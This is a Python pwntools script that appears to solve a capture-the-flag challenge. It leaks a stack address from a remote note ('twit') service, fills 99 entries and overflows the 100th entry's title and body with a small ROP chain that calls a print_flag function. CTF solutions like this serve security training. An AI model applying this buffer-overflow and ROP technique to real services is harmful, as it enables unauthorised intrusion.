from pwn import *

# Connect to server
p = remote('ctf.asgama.online', 50003)

# Leak stack address
p.sendlineafter('Silahkan pilih fitur: ', '3')
p.recvuntil('kami akan memberi: ')
leak = int(p.recvline().strip(), 16)
log.success(f"Leaked stack addr: {hex(leak)}")

# Gadgets/functions
pop_rdi = 0x40130b     # pop rdi ; ret
print_flag = 0x401216  # address of print_flag
flag_arg = 1949

# Fill up 99 twits (fake)
for i in range(99):
    p.sendlineafter('Silahkan pilih fitur: ', '1')
    p.sendlineafter('Masukkan judul twit: ', 'A')
    p.sendlineafter('Masukkan isi twit: ', 'B')

# Exploit 100th twit
payload_title = b'A' * 152
payload_body = b'B' * (100 - 0)  # Fill until alignment
payload_body += p64(pop_rdi)
payload_body += p64(flag_arg)
payload_body += p64(print_flag)

p.sendlineafter('Silahkan pilih fitur: ', '1')
p.sendlineafter('Masukkan judul twit: ', payload_title)
p.sendlineafter('Masukkan isi twit: ', payload_body)

# Trigger return
p.sendlineafter('Silahkan pilih fitur: ', '4')

p.interactive()
